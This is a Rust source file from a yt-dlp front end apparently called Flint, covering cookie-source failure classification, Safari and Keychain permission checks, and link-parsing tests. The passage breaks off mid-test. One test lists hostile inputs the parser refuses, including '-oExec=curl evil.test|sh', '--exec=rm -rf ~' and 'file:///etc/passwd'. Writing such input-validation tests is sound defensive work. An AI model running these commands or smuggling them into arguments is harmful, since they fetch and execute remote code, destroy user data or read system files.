    /// have their own sentence ([`FetchFailure::SafariNeedsFullDiskAccess`],
    /// [`FetchFailure::BrowserKeychainRefused`]) are tested first and stay first; this is the
    /// honest answer for everything else that stopped the jar from opening.
    #[error(
        "Flint could not read the sign-in from that browser, so the site was asked \
         for this video with no sign-in at all. Check that the browser is installed and that you \
         are signed in to the site in it, or export a cookies.txt file and point Settings → Links \
         at that instead."
    )]
    BrowserCookiesUnreadable,
    /// The exported `cookies.txt` could not be read: gone, moved, or not in the format the file
    /// claims to be in.
    ///
    /// Measured, with a file that is not a cookie jar:
    ///
    /// ```text
    /// ERROR: '/Users/…/cookies.txt' does not look like a Netscape format cookies file
    /// ```
    ///
    /// A file that is simply *missing* never reaches this point, and that is worth knowing: yt-dlp
    /// treats a `--cookies` path that does not exist as an empty jar and says nothing at all, so
    /// the app refuses that source before it runs anything (`settings_store::classify_cookies`).
    /// This branch is for the file that was there and could not be used.
    #[error(
        "Flint could not read that cookies.txt file, so the site was asked for this \
         video with no sign-in at all. Export cookies.txt from your browser again and choose it in \
         Settings → Links, or borrow the sign-in from a browser instead."
    )]
    CookiesFileUnreadable,
    /// Safari's cookie jar, measured on macOS under the app's own minimal environment:
    ///
    /// ```text
    /// ERROR: [Errno 1] Operation not permitted: '/Users/…/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies'
    /// ```
    ///
    /// Not a bug and not something we can work around in code: macOS keeps that file behind Full
    /// Disk Access, so an app without it gets `EPERM` however well-formed the request. The honest
    /// message therefore has to name the permission, name Safari, and offer the way out that does
    /// not involve a trip to System Settings at all.
    ///
    /// It also has to say the two things that make Safari keep failing for somebody who did
    /// everything they were told, both measured on the machine this came from:
    ///
    /// * TCC only consults the grant when a process **starts**, so an app that was already running
    ///   when the switch was flipped stays denied until it is quit and opened again;
    /// * TCC keys the grant to the **code signature**, and a locally built copy is
    ///   `adhoc, linker-signed` with `TeamIdentifier=not set` - a different signature after every
    ///   rebuild. The old entry stays visible in the Full Disk Access list, switched on, granting
    ///   nothing; it has to be switched off and on again (or removed and re-added) for the copy
    ///   that is there now.
    ///
    /// This is the one place either fact is written, because this is where the other Safari wording
    /// already lives - the sign-in check reports the same failure with the same sentence.
    #[error(
        "Safari keeps its cookies where only an app with Full Disk Access can read them, and \
         Flint does not have it. Grant it in System Settings → Privacy & Security → \
         Full Disk Access, then quit Flint and open it again - the permission only \
         reaches an app that was started after it was given. A copy you built yourself loses the \
         grant every time it is rebuilt, so switch it off and on again in that list. The easier \
         route is to pick a browser in Settings → Links that needs no permission at all."
    )]
    SafariNeedsFullDiskAccess,
    /// A Chrome-family jar on macOS whose decryption key stayed locked in the login Keychain.
    ///
    /// Chrome, Chromium, Edge, Brave, Vivaldi and Opera encrypt their cookies with a key macOS
    /// keeps in the login Keychain, and reading it makes the system show a prompt the first time.
    /// yt-dlp asks for it with `security find-generic-password` and, when that is refused or
    /// dismissed, says so - `find-generic-password failed` - then carries on with cookies it cannot
    /// decrypt, which the site sees as no sign-in at all. Without this branch that lands on the
    /// sign-in wall above and sends the user looking for an expired account.
    ///
    /// One honest limitation: that line is a *warning*, and [`probe_args`] passes `--no-warnings`,
    /// so it reaches the fetch's stderr but not the probe's. A members-only page whose probe fails
    /// first therefore still reads as [`FetchFailure::CookiesNotAccepted`]. Dropping `--no-warnings`
    /// would fix that (and would also let the probe see yt-dlp's missing-runtime warning), but it
    /// changes the stderr every other branch here reads, so it is left as it was.
    #[error(
        "macOS did not let Flint unlock that browser's cookies: the login Keychain \
         prompt was refused or dismissed, so the cookies could not be decrypted. Try again and \
         choose Allow (or Always Allow), or export a cookies.txt file and point Settings → Links \
         at that instead."
    )]
    BrowserKeychainRefused,
    /// The failure that used to be reported as [`FetchFailure::LoginRequired`], which sent people
    /// looking for an account problem they did not have.
    ///
    /// YouTube's challenges need a JavaScript runtime; without one, yt-dlp takes the deprecated
    /// no-runtime path and the site answers "Sign in to confirm you're not a bot". The next step is
    /// one click in Settings, not a Google password (see [`JsRuntime`]).
    #[cfg_attr(
        not(windows),
        error(
            "YouTube needs a JavaScript runtime to hand this video over, and Flint could \
         not use one. Open Settings → Helpers and install Deno (one click), then try again."
        )
    )]
    #[cfg_attr(windows, error(
        "YouTube needs a JavaScript runtime. Install Deno using the Windows instructions in Settings -> Helpers, then restart the app and retry."
    ))]
    NoJsRuntime,
    #[error("Could not reach the site. Check your internet connection and try again.")]
    Network,
    #[cfg_attr(
        not(windows),
        error(
            "yt-dlp could not read this page - the site has changed since this copy of yt-dlp was \
         built. Update it (`brew upgrade yt-dlp`) and try again."
        )
    )]
    #[cfg_attr(windows, error(
        "yt-dlp could not read this page. Update it in PowerShell with `winget upgrade --exact --id yt-dlp.yt-dlp`, then try again."
    ))]
    Outdated,
    #[error("The download produced no file.")]
    NoFile,
    #[error("yt-dlp could not download this video: {0}")]
    Other(String),
}

impl FetchFailure {
    /// Is this one of the failures where the cookie *source* was never read?
    ///
    /// The four ways that happens, and they are deliberately grouped: whichever of them it was, the
    /// site never saw a sign-in, so nothing has been learned about the user's account and telling
    /// them to sign in again would be a guess. It is what the sign-in check reports
    /// [`CookieCheck::Unreadable`] from, and what lets a row offer "try a different browser"
    /// instead of "your session expired".
    ///
    /// Written as an exhaustive match rather than a `matches!`, so a failure added later has to
    /// answer this question on purpose.
    pub fn is_unreadable_cookie_source(&self) -> bool {
        match self {
            FetchFailure::SafariNeedsFullDiskAccess
            | FetchFailure::BrowserKeychainRefused
            | FetchFailure::BrowserCookiesUnreadable
            | FetchFailure::CookiesFileUnreadable => true,
            FetchFailure::NotInstalled
            | FetchFailure::Removed
            | FetchFailure::Private
            | FetchFailure::AgeRestricted
            | FetchFailure::GeoBlocked
            | FetchFailure::LoginRequired
            | FetchFailure::CookiesNotAccepted
            | FetchFailure::NoJsRuntime
            | FetchFailure::Network
            | FetchFailure::Outdated
            | FetchFailure::NoFile
            | FetchFailure::Other(_) => false,
        }
    }
}

/// Turn yt-dlp's stderr into one of the failures above.
///
/// Order matters: an age-restricted video also says "sign in", and a site change also says "unable
/// to extract", so the more specific test has to come first.
///
/// `js_runtime` is the second fact this needs, and the reason it is a parameter rather than a
/// lookup: "Sign in to confirm you're not a bot" is what YouTube says both to a genuine sign-in
/// wall *and* to a degraded extraction, and only the caller knows whether yt-dlp was given a
/// runtime. Without it this function blamed the user's Google account for a missing helper.
///
/// `cookies` is the third, and it is there for the same shape of mistake one step further on: with
/// a cookie source configured, a sign-in wall is not "you should turn on the cookie setting" but
/// "the cookies did not satisfy the site". Telling somebody who has already done the thing to do
/// the thing is how the previous message dead-ended, and this is where that is avoided.
///
/// It answers a second question too, and that one is newer: *was the source read at all?* "The site
/// would not accept your sign-in" is misleading advice when the jar never opened, so
/// [`unreadable_cookie_source`] is consulted before the wall and yields its own sentences.
pub fn classify_failure(
    stderr: &str,
    js_runtime: Option<&JsRuntime>,
    cookies: Option<&CookieFlag>,
) -> FetchFailure {
    let text = stderr.to_ascii_lowercase();
    let has = |needle: &str| text.contains(needle);

    if has("age-restricted")
        || has("age restricted")
        || has("confirm your age")
        || has("inappropriate for some users")
    {
        return FetchFailure::AgeRestricted;
    }
    if has("private video") || has("this video is private") {
        return FetchFailure::Private;
    }
    if has("video unavailable")
        || has("has been removed")
        || has("no longer available")
        || has("this video does not exist")
        || has("removed by the uploader")
    {
        return FetchFailure::Removed;
    }
    if has("available in your country")
        || has("not available from your location")
        || has("geo restricted")
        || has("geo-restricted")
        || has("blocked it in your country")
    {
        return FetchFailure::GeoBlocked;
    }
    // The cookie jar we were told to read and could not, ahead of everything the site says about
    // it: a jar that never opened is the *cause*, and the sign-in wall further down is only the
    // consequence. Both of these are macOS permission facts rather than anything about the video.
    //
    // `Cookies.binarycookies` is Safari's jar and nothing else's, and yt-dlp only ever names the
    // path when opening it raised an `OSError` - a successful extraction says "Extracted N cookies
    // from safari" and names no file. The `FileNotFoundError` wording is the other side of the same
    // permission: without Full Disk Access the container path does not even stat.
    if has("binarycookies") || has("safari cookies database") {
        return FetchFailure::SafariNeedsFullDiskAccess;
    }
    // The Chrome-family equivalent, and it *is* distinguishable: yt-dlp shells out to
    // `security find-generic-password` for the key macOS keeps in the login Keychain and warns
    // `find-generic-password failed` when the prompt is refused or dismissed. It then continues
    // with a jar it cannot decrypt, which the site reads as no sign-in at all - so without this
    // branch the failure lands on the wall below and blames an account that is perfectly fine.
    if has("find-generic-password failed") || has("exception running find-generic-password") {
        return FetchFailure::BrowserKeychainRefused;
    }
    // Everything else that stopped the jar from opening, still ahead of the sign-in wall and for
    // the same reason: a source that was never read is the cause, and the site's answer is only
    // the consequence. Folding these into "your sign-in has expired" sent people to sign in again
    // in a browser whose cookies this app had not so much as looked at.
    if let Some(unreadable) = unreadable_cookie_source(&text, cookies) {
        return unreadable;
    }
    // The missing runtime, in yt-dlp's words or in YouTube's, and *before* the sign-in wall below.
    //
    // yt-dlp's own warning is the plain statement of it ("No supported JavaScript runtime could be
    // found"), and it is a warning rather than an error: it precedes the failure instead of being
    // it. YouTube's answer to the extraction that follows is "Sign in to confirm you're not a bot",
    // word for word what a real sign-in wall says - so the bot check only means "missing runtime"
    // when we know we had none to give. With a runtime present it is a sign-in wall, and falls
    // through to the branch below.
    // "you're not a bot" and "you are not a bot" have both been seen, and the apostrophe itself
    // comes back as `'` or `’` depending on the page, so the needle is the part that never varies.
    let bot_check = has("not a bot");
    if has("no supported javascript runtime")
        || has("javascript runtime could be found")
        || (bot_check && js_runtime.is_none())
    {
        return FetchFailure::NoJsRuntime;
    }
    if has("sign in to confirm")
        || has("login required")
        || has("requires authentication")
        || has("use --cookies")
        || has("members-only")
        || has("account credentials")
    {
        // The same wall, two different next steps. Nothing about the cookies themselves is looked
        // at here - only whether there were any - because "which cookie" is not a question this
        // function could answer and not one the user needs answered.
        return match cookies {
            Some(_) => FetchFailure::CookiesNotAccepted,
            None => FetchFailure::LoginRequired,
        };
    }
    if has("is live")
        || has("live event will begin")
        || has("this live stream")
        || has("premieres in")
    {
        return FetchFailure::Other(
            "This is a live stream. Wait until it has finished and try the recording.".into(),
        );
    }
    if has("unable to download webpage")
        || has("temporary failure in name resolution")
        || has("network is unreachable")
        || has("connection reset")
        || has("connection refused")
        || has("timed out")
        || has("getaddrinfo")
        || has("urlopen error")
        || has("failed to resolve")
    {
        return FetchFailure::Network;
    }
    if has("unable to extract")
        || has("nsig extraction failed")
        || has("player response")
        || has("update yt-dlp")
        || has("signature extraction")
        || has("unsupported url")
        // What a yt-dlp older than the flag itself says about `--js-runtimes` (it arrived with
        // 2025.11.12, the release that brought external JavaScript runtimes). "Update it" is
        // exactly the right answer, and the alternative was echoing `no such option` at the user.
        || has("no such option")
    {
        return FetchFailure::Outdated;
    }
    FetchFailure::Other(last_meaningful_line(stderr))
}

/// Did the cookie *source* itself fail to open, and which of the two sources was it?
///
/// Only ever asked when a source was configured: with none there is no jar to have failed, and
/// every needle below would then be answering a question nobody asked. Each arm looks only at the
/// failures its own kind of source can have, which is what keeps a browser message off a file
/// problem and stops either from claiming a sign-in wall it did not cause.
///
/// The needles are measured against yt-dlp 2026.08.19: `could not find chrome cookies database in
/// "…"` for a browser that is not installed, `'…' does not look like a Netscape format cookies
/// file` for an export that is not one, `[Errno 21] Is a directory: '…'` for a folder. Safari's
/// Full Disk Access and the refused Keychain prompt are matched *before* this and keep their own
/// sentences: they are the two cases where the user can do something specific about the permission.
fn unreadable_cookie_source(text: &str, cookies: Option<&CookieFlag>) -> Option<FetchFailure> {
    let has = |needle: &str| text.contains(needle);
    // A jar we were refused by the operating system rather than by the site. Only counted when the
    // line is about a cookie at all, since "permission denied" on its own is as likely to be about
    // the folder we are writing into.
    let denied = has("cookie") && (has("permission denied") || has("operation not permitted"));
    match cookies? {
        CookieFlag::Browser(_) => (has("cookies database")
            || has("cookie database")
            || has("could not copy")
            || has("could not decrypt")
            || has("failed to decrypt")
            || has("could not be decrypted")
            || has("unsupported browser")
            || denied)
            .then_some(FetchFailure::BrowserCookiesUnreadable),
        CookieFlag::File(_) => (has("netscape format") || has("is a directory") || denied)
            .then_some(FetchFailure::CookiesFileUnreadable),
    }
}

/// The tail of a tool's stderr, which is where its verdict is.
fn last_meaningful_line(stderr: &str) -> String {
    let line = stderr
        .lines()
        .map(str::trim)
        .rev()
        .find(|l| !l.is_empty())
        .unwrap_or("no output from yt-dlp");
    line.chars().filter(|c| !c.is_control()).take(300).collect()
}

// ---------------------------------------------------------------------------------------------
// Checking the sign-in, before a link needs it
// ---------------------------------------------------------------------------------------------

/// The video one throwaway sign-in check is run against.
///
/// It has to be a page whose *only* possible objection is the cookie source, so that whatever comes
/// back is about the sign-in and not about the video: public, not age-restricted, not members-only,
/// not a live recording, and old enough that it will still be there next year. Measured on
/// 2026-09-09 with yt-dlp 2026.08.19, this one answers with its title and duration on a machine
/// with no sign-in at all and no JavaScript runtime.
///
/// The obvious alternative - yt-dlp's own test video, `BaW_jenozKc` - was measured first and
/// rejected: it now answers "This video is unavailable", which would report every user's cookies as
/// broken. This URL is also the one the tests in this file have used as their example all along.
pub const COOKIE_TEST_URL: &str = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

/// How long a sign-in check may take before it is stopped.
///
/// A metadata probe of one public page is a second or two; the budget is short because the user is
/// sitting in front of the answer, and because a browser jar that raises a system prompt nobody is
/// there to click would otherwise hang the drawer indefinitely.
pub const COOKIE_TEST_TIMEOUT_SECS: u64 = 20;

/// Said when the check worked, and deliberately narrow about what that proves: the source was
/// readable and the site served the page. It does not claim the account can see any *particular*
/// video, because one public page cannot show that.
pub const COOKIE_TEST_WORKS: &str =
    "That sign-in works: Flint read it and the site handed the test video over.";

/// What one throwaway check proved about the configured sign-in.
///
/// Three answers the user can act on and two they cannot mistake for the others, which is the whole
/// reason the check exists: "it works", "the sign-in could not be read", "it was read and the site
/// said no" send people to three different places, and before this they all read as the same red
/// line of text.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum CookieCheck {
    /// The source was read and the site served the page.
    Working,
    /// The cookie jar never opened: Safari's Full Disk Access, a refused Keychain prompt, a
    /// cookies.txt that is gone or is not a cookies.txt. Nothing about the account is known.
    Unreadable,
    /// The cookies were read and the site refused them anyway - expired, or the wrong account.
    Refused,
    /// Something that is not about the sign-in got in the way (no yt-dlp, no JavaScript runtime,
    /// no network, too slow). Reported as itself rather than blamed on the cookies.
    Inconclusive,
    /// There is no sign-in to check. Never produced by a probe - it is the answer when the settings
    /// say "no cookies", where running anything at all would be reading a jar nobody asked us to.
    NotConfigured,
}

impl CookieCheck {
    /// Is the configured sign-in usable? Exactly one verdict says yes.
    pub fn ok(self) -> bool {
        matches!(self, CookieCheck::Working)
    }
}

/// What one sign-in check did, as the engine saw it.
///
/// Kept out of the shell so the mapping from "what yt-dlp did" to "what the user is told" is one
/// pure function with tests, rather than a `match` in a command nobody can run without a network.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CookieProbe {
    /// yt-dlp read the source and the site answered.
    Worked,
    /// yt-dlp refused, classified exactly as a real fetch would have been.
    Failed(FetchFailure),
    /// Still running when [`COOKIE_TEST_TIMEOUT_SECS`] ran out, and killed.
    TimedOut,
}

impl CookieProbe {
    /// Which of the answers above this is.
    ///
    /// Note where the sign-in wall lands: [`FetchFailure::LoginRequired`] means the site asked for
    /// a sign-in and got none it accepted, which for a check that *was* given a source is the same
    /// event as [`FetchFailure::CookiesNotAccepted`]. Everything else is inconclusive rather than
    /// damning - a missing JavaScript runtime says nothing whatever about the user's cookies.
    pub fn verdict(&self) -> CookieCheck {
        match self {
            CookieProbe::Worked => CookieCheck::Working,
            CookieProbe::TimedOut => CookieCheck::Inconclusive,
            CookieProbe::Failed(failure) if failure.is_unreadable_cookie_source() => {
                CookieCheck::Unreadable
            }
            CookieProbe::Failed(FetchFailure::CookiesNotAccepted | FetchFailure::LoginRequired) => {
                CookieCheck::Refused
            }
            CookieProbe::Failed(_) => CookieCheck::Inconclusive,
        }
    }

    /// The sentence the user reads. Every failure keeps the words [`classify_failure`] already
    /// gives it, so a check and a failed row never explain the same thing two ways.
    pub fn message(&self) -> String {
        match self {
            CookieProbe::Worked => COOKIE_TEST_WORKS.to_string(),
            CookieProbe::Failed(failure) => failure.to_string(),
            CookieProbe::TimedOut => format!(
                "The sign-in check was still running after {COOKIE_TEST_TIMEOUT_SECS} seconds and \
                 was stopped, so it proved nothing either way. Check your internet connection and \
                 try again."
            ),
        }
    }
}

// ---------------------------------------------------------------------------------------------
// Safari, answered without the network
// ---------------------------------------------------------------------------------------------

/// What happened when Safari's cookie jar was opened for reading - and nothing more than opened.
///
/// This exists because the app used to answer "can we use your Safari sign-in?" the long way
/// round: run yt-dlp against a public video with `--cookies-from-browser safari`, wait up to
/// [`COOKIE_TEST_TIMEOUT_SECS`] for the network, and read the permission out of its stderr. The
/// question is a local one. macOS keeps `Cookies.binarycookies` behind Full Disk Access, so
/// `open(2)` answers it in microseconds: `EPERM` means the app does not have the permission, full
/// stop, and no other explanation of that error exists on that path.
///
/// What the caller must do with the file it opened is *nothing*: drop the handle, or read zero
/// bytes. The verdict is made of an error code and a `stat`, never of a cookie.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum SafariCookieAccess {
    /// The file opened. Full Disk Access is in place; whether the *site* accepts what is inside is
    /// a different question, and the only one still worth a probe.
    Readable,
    /// `EPERM` or `EACCES`. The app lacks Full Disk Access - see
    /// [`FetchFailure::SafariNeedsFullDiskAccess`] for the two reasons a user who granted it can
    /// still be here.
    NeedsFullDiskAccess,
    /// There is no such file. Safari has never written a cookie jar on this Mac, so there is no
    /// sign-in of theirs to borrow (a fresh account, or a Mac where Safari has not been opened).
    NoCookieStore,
    /// The open failed for some third reason - a disk error, a jar that is not a file. Rare enough
    /// that it gets the general "could not read that browser's sign-in" wording rather than an
    /// invented one.
    Unreadable,
}

impl SafariCookieAccess {
    /// Read the outcome of `File::open`, given only the *kind* of error it raised (`None` when it
    /// opened).
    ///
    /// Pure, so the mapping is testable without a Mac, a permission or a cookie jar.
    /// `PermissionDenied` is Rust's name for both `EPERM` - which is what macOS returns for a TCC
    /// refusal, measured - and `EACCES`.
    pub fn from_open_error(kind: Option<std::io::ErrorKind>) -> Self {
        match kind {
            None => SafariCookieAccess::Readable,
            Some(std::io::ErrorKind::PermissionDenied) => SafariCookieAccess::NeedsFullDiskAccess,
            Some(std::io::ErrorKind::NotFound) => SafariCookieAccess::NoCookieStore,
            Some(_) => SafariCookieAccess::Unreadable,
        }
    }

    /// Is Safari's jar readable by this app, right now?
    pub fn ok(self) -> bool {
        matches!(self, SafariCookieAccess::Readable)
    }

    /// The sign-in check's verdict, or `None` when this proves nothing either way and the probe is
    /// still the only thing that can answer.
    ///
    /// Only [`SafariCookieAccess::Readable`] is `None`: an openable jar says the permission is
    /// there, not that the site will take what is in it.
    pub fn verdict(self) -> Option<CookieCheck> {
        match self {
            SafariCookieAccess::Readable => None,
            _ => Some(CookieCheck::Unreadable),
        }
    }

    /// The sentence to show. Every failing case reuses the words a failed row would have used for
    /// the same cause, so the check and the row never explain one thing two ways.
    pub fn message(self) -> String {
        match self {
            SafariCookieAccess::Readable => SAFARI_COOKIES_READABLE.to_string(),
            SafariCookieAccess::NeedsFullDiskAccess => {
                FetchFailure::SafariNeedsFullDiskAccess.to_string()
            }
            SafariCookieAccess::NoCookieStore => SAFARI_HAS_NO_COOKIE_STORE.to_string(),
            SafariCookieAccess::Unreadable => FetchFailure::BrowserCookiesUnreadable.to_string(),
        }
    }
}

/// Open Safari's cookie jar for reading, close it again unread, and say what happened.
///
/// The whole check, and deliberately the whole of it: `File::open` and a `drop`. No byte is read,
/// nothing is parsed, no network is touched, and yt-dlp is not involved - the only thing this
/// learns is whether the operating system let the app have a handle, which is exactly the question
/// "does this app have Full Disk Access?" on that path.
pub fn safari_cookie_access(jar: &Path) -> SafariCookieAccess {
    match std::fs::File::open(jar) {
        // Dropped immediately, and never handed to a reader: `Ok` is the entire answer.
        Ok(file) => {
            drop(file);
            SafariCookieAccess::Readable
        }
        Err(error) => SafariCookieAccess::from_open_error(Some(error.kind())),
    }
}

/// Said when the permission is in place, and careful about what that proves: the file opened, and
/// nothing was taken out of it.
pub const SAFARI_COOKIES_READABLE: &str =
    "Flint can read Safari's cookies: Full Disk Access is in place. Nothing was read \
     out of the file - whether the site accepts that sign-in is the next question.";

/// Said when Safari has no cookie jar at all, which is not a permission problem and must not be
/// dressed up as one.
pub const SAFARI_HAS_NO_COOKIE_STORE: &str =
    "Safari has no saved cookies on this Mac, so there is no sign-in to borrow from it. Sign in to \
     the site in Safari, or choose another browser in Settings → Links.";

/// The file a finished fetch produced, inside the job's scratch directory.
///
/// A merged download can leave the streams it merged next to the result, so the largest
/// `source.*` wins - and the fragments yt-dlp names `source.f137.mp4` are ignored outright: only a
/// single-dot name is the finished file.
pub fn downloaded_file(dir: &Path) -> Option<PathBuf> {
    let mut best: Option<(u64, PathBuf)> = None;
    for entry in std::fs::read_dir(dir).ok()?.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        let Some(extension) = name.strip_prefix(&format!("{DOWNLOAD_STEM}.")) else { continue };
        if extension.is_empty() || extension.contains('.') || extension.ends_with("part") {
            continue;
        }
        if !entry.path().is_file() {
            continue;
        }
        let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
        if best.as_ref().is_none_or(|(b, _)| size > *b) {
            best = Some((size, entry.path()));
        }
    }
    best.map(|(_, p)| p)
}

/// A one-line summary for the row, before anything has been downloaded.
pub fn link_summary(link: &Link, target: &Format) -> String {
    format!("{} → {}", link.site().label(), output_extension(target).to_ascii_uppercase())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::format::by_id;
    use crate::settings::{CookieSource, LinkSettings};

    #[test]
    fn music_links_are_single_tracks_and_never_host_lookalikes() {
        for (raw, site) in [
            ("https://y.qq.com/n/ryqq/songDetail/004Ti8rT003TaZ", LinkSite::QQMusic),
            ("https://music.163.com/#/song?id=17241424", LinkSite::NetEase),
            ("https://y.music.163.com/m/song?id=95670&foo=bar", LinkSite::NetEase),
            ("https://soundcloud.com/the80m/the-following", LinkSite::SoundCloud),
            ("https://soundcloud.com/artist/track/s-secret", LinkSite::SoundCloud),
            ("https://benprunty.bandcamp.com/track/lanius-battle", LinkSite::Bandcamp),
        ] {
            let link = Link::parse(raw).unwrap();
            assert_eq!(link.site(), site);
            assert_eq!(site.category(), Category::Audio);
            assert_eq!(link.url(), raw);
        }
        for raw in [
            "https://y.qq.com/n/ryqq/playlist/123",
            "https://music.163.com/#/playlist?id=123",
            "https://music.163.com/#/song?id=abc",
            "https://soundcloud.com/artist/sets/album",
            "https://soundcloud.com/artist/tracks",
            "https://soundcloud.com/artist",
            "https://artist.bandcamp.com/album/release",
            "https://artist.bandcamp.com.evil.test/track/song",
            "https://artist.nested.bandcamp.com/track/song",
            "https://evilbandcamp.com/track/song",
            "https://y.qq.com:8080/n/ryqq/songDetail/123",
            "https://soundcloud.com\\@evil.test/artist/track",
            "https://open.spotify.com/track/abc",
        ] {
            assert!(Link::parse(raw).is_err(), "{raw}");
        }
    }

    #[test]
    fn music_metadata_rejects_previews_drm_collections_and_short_results() {
        let base = serde_json::json!({"title":"Song\nTitle", "duration":240, "formats":[{
            "format_id":"mp3", "vcodec":"none", "url":"https://cdn.example/song.mp3"
        }]});
        assert_eq!(parse_music_probe(&base.to_string()).unwrap().duration_secs, Some(240.0));
        for change in [
            serde_json::json!({"_type":"playlist"}),
            serde_json::json!({"is_live":true}),
            serde_json::json!({"formats":[{"format_id":"hls_preview","vcodec":"none","url":"https://cdn.example/song"}]}),
            serde_json::json!({"formats":[{"has_drm":true,"vcodec":"none","url":"https://cdn.example/song"}]}),
        ] {
            let mut value = base.clone();
            value.as_object_mut().unwrap().extend(change.as_object().unwrap().clone());
            assert!(parse_music_probe(&value.to_string()).is_err(), "{value}");
        }
        assert!(parse_music_probe("not json").is_err());
        assert!(incomplete_music(Some(240.0), Some(30.0)));
        assert!(!incomplete_music(Some(240.0), Some(239.5)));
        let link = Link::parse("https://soundcloud.com/artist/track").unwrap();
        let args = fetch_args(&link, &bare(Path::new("/tmp/song")));
        assert!(args.contains(&"--ignore-config".into()));
        assert!(args.contains(&"--embed-metadata".into()));
        assert!(args.iter().any(|s| s.contains("format_id!*=preview")));
        assert_eq!(args[args.len() - 2], "--");
    }

    fn parse(raw: &str) -> Result<Link, LinkError> {
        Link::parse(raw)
    }

    /// The runtime a Mac with Homebrew actually has, as discovery would report it.
    fn deno() -> JsRuntime {
        JsRuntime::new(Tool::Deno, PathBuf::from("/opt/homebrew/bin/deno")).expect("a runtime")
    }

    /// Options with no helpers at all, which is every argv test that is not about a helper.
    fn bare(dir: &Path) -> FetchOptions {
        FetchOptions {
            ffmpeg: None,
            js_runtime: None,
            dir: dir.to_path_buf(),
            audio_only: false,
            cookies: None,
        }
    }

    /// Options that differ from [`bare`] in exactly one thing: whose sign-in they lend.
    fn with_cookies(dir: &Path, cookies: Option<CookieFlag>) -> FetchOptions {
        FetchOptions { cookies, ..bare(dir) }
    }

    /// The table this feature lives or dies by. Everything on the left is a real thing people
    /// paste; everything on the right is what they are told when we will not take it.
    #[test]
    fn the_accepted_links_are_exactly_the_ones_a_person_would_paste() {
        for (url, site) in [
            ("https://www.youtube.com/watch?v=dQw4w9WgXcQ", LinkSite::YouTube),
            ("http://youtube.com/watch?v=dQw4w9WgXcQ", LinkSite::YouTube),
            ("https://m.youtube.com/watch?v=abc123", LinkSite::YouTube),
            ("https://music.youtube.com/watch?v=abc123", LinkSite::YouTube),
            // The list a video sits in is harmless: `--no-playlist` downloads the video.
            ("https://www.youtube.com/watch?v=abc123&list=PL0000", LinkSite::YouTube),
            ("https://youtu.be/dQw4w9WgXcQ", LinkSite::YouTube),
            ("https://youtu.be/dQw4w9WgXcQ?t=42", LinkSite::YouTube),
            ("https://www.youtube.com/shorts/abcDEF12345", LinkSite::YouTube),
            ("https://www.youtube.com/embed/abcDEF12345", LinkSite::YouTube),
            ("https://www.bilibili.com/video/BV1GJ411x7h7", LinkSite::Bilibili),
            ("https://www.bilibili.com/video/BV1GJ411x7h7/?p=2", LinkSite::Bilibili),
            ("https://m.bilibili.com/video/av170001", LinkSite::Bilibili),
            ("https://b23.tv/abcd123", LinkSite::Bilibili),
            // Uppercase host and a trailing dot are the same host to DNS, and to us.
            ("https://WWW.YouTube.com/watch?v=abc123", LinkSite::YouTube),
            ("https://www.youtube.com./watch?v=abc123", LinkSite::YouTube),
            ("  https://youtu.be/abc123  ", LinkSite::YouTube),
        ] {
            let link = parse(url).unwrap_or_else(|e| panic!("{url} must be accepted: {e}"));
            assert_eq!(link.site(), site, "{url}");
            assert_eq!(link.url(), url.trim(), "the url is passed through untouched");
        }
    }

    /// Hostile input first, because this is the one that matters: nothing here may ever become an
    /// argument, and every refusal has to say something the user can act on.
    #[test]
    fn nothing_that_is_not_a_video_link_gets_anywhere_near_an_argument() {
        let cases: Vec<(&str, LinkError)> = vec![
            // A string crafted to be read as a flag if it ever reached argv.
            (
                "-oExec=curl evil.test|sh",
                LinkError::NotAUrl { shown: "-oExec=curl evil.test|sh".into() },
            ),
            ("--exec=rm -rf ~", LinkError::NotAUrl { shown: "--exec=rm -rf ~".into() }),
            (
                "-o/tmp/pwned https://youtu.be/abc",
                LinkError::NotAUrl { shown: "-o/tmp/pwned https://youtu.be/abc".into() },
            ),
            // Not http(s), so nothing can be executed or read off the disk through it.
            ("file:///etc/passwd", LinkError::NotAUrl { shown: "file:///etc/passwd".into() }),
            ("javascript:alert(1)", LinkError::NotAUrl { shown: "javascript:alert(1)".into() }),
            (
                "ftp://youtube.com/watch?v=a",
                LinkError::NotAUrl { shown: "ftp://youtube.com/watch?v=a".into() },
            ),
            // Lookalikes: a suffix or substring check would take every one of these.
            (
                "https://youtube.com.evil.test/watch?v=a",
                LinkError::UnknownHost { host: "youtube.com.evil.test".into() },
            ),
            (
                "https://notyoutube.com/watch?v=a",
                LinkError::UnknownHost { host: "notyoutube.com".into() },
            ),
            (
                "https://youtube.com.co/watch?v=a",
                LinkError::UnknownHost { host: "youtube.com.co".into() },
            ),
            (
                "https://evil.test/youtube.com/watch?v=a",
                LinkError::UnknownHost { host: "evil.test".into() },
            ),
            (
                "https://bilibili.com.cn/video/BV1",
                LinkError::UnknownHost { host: "bilibili.com.cn".into() },
            ),
            // Credentials in the authority: the real host is the one after the `@`.
            ("https://www.youtube.com@evil.test/watch?v=a", LinkError::Credentials),
            // The shapes that would blow past the cap, or cannot work at all.
            ("https://www.youtube.com/playlist?list=PL0000", LinkError::Playlist),
            ("https://youtu.be/playlist?list=PL0000", LinkError::Playlist),
            ("https://www.bilibili.com/medialist/detail/ml123", LinkError::Playlist),
            ("https://www.youtube.com/channel/UC123", LinkError::Channel),
            ("https://www.youtube.com/c/SomeCreator", LinkError::Channel),
            ("https://www.youtube.com/@somecreator", LinkError::Channel),
            ("https://www.youtube.com/user/somebody", LinkError::Channel),
            (
                "https://space.bilibili.com/123",
                LinkError::UnknownHost { host: "space.bilibili.com".into() },
            ),
            ("https://www.bilibili.com/space/123", LinkError::Channel),
            ("https://www.youtube.com/live/abc123", LinkError::Live),
            ("https://live.bilibili.com/123", LinkError::Live),
            // Right host, wrong page.
            (
                "https://www.youtube.com/watch?list=PL0000",
                LinkError::NotAVideoPage { site: LinkSite::YouTube },
            ),
            ("https://www.youtube.com/", LinkError::NotAVideoPage { site: LinkSite::YouTube }),
            (
                "https://www.bilibili.com/bangumi/play/ep1",
